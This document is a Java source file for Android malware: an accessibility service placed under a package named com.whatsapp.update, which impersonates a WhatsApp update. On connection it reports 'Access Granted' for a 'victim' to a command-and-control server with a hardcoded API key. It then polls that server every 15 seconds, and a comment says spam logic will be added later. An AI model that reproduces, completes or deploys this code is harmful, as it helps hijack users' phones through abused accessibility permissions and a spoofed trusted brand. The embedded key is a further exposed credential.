package com.whatsapp.update;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SpamService extends AccessibilityService {
    private static final String C2_URL = "https://malbot-c2.onrender.com/get?victim=test";
    private static final String PING_URL = "https://malbot-c2.onrender.com/set";

    @Override
    public void onServiceConnected() {
        // Send a Ping to the C2 that we have access
        new Thread(() -> {
            try {
                URL url = new URL(PING_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("X-API-Key", "4FFJcLDA8E6ks-7MJYOpg06eWY1IVIXTippG_J5P-Q4");
                conn.setDoOutput(true);
                // We set Class 99 to 1 to represent "Access Granted"
                String jsonInputString = "{\"victim\": \"test\", \"class\": 99, \"state\": 1}";
                conn.getOutputStream().write(jsonInputString.getBytes("UTF-8"));
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();

        // Start the C2 Poller
        new Thread(() -> {
            while (true) {
                try {
                    HttpURLConnection conn = (HttpURLConnection) new URL(C2_URL).openConnection();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String response = reader.readLine();
                    reader.close();
                    // Spam logic will go here later
                    Thread.sleep(15000);
                } catch (Exception e) { e.printStackTrace(); }
            }
        }).start();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override
    public void onInterrupt() {}
}
